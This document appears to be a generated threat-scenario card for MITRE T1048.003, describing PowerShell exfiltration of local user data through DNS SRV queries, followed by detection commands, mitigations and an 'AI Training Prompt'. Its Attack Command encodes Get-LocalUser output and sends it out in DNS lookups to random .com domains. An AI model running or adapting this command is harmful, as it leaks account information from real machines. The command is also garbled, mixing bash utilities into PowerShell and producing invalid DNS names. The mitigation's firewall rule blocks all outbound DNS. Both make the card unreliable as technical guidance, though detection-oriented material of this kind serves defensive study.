---
type: campaign
scenario_id: 411
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using PowerShell to exfiltrate user profile data via DNS SRV queries.

## Threat Description
Using PowerShell to exfiltrate user profile data via DNS SRV queries.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $user = Get-LocalUser | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($user)); Resolve-DnsName -Type SRV _$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)._tcp.$(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null"
```

## Detection Logic
Monitor user DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-LocalUser`; DNS SRV spikes: `tshark -Y 'dns.qry.type == 33'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block SRV DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect PowerShell user profile exfiltration via DNS SRV queries by analyzing base64-encoded subdomains, Get-LocalUser execution, and DNS traffic patterns; suggest DNS filtering.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
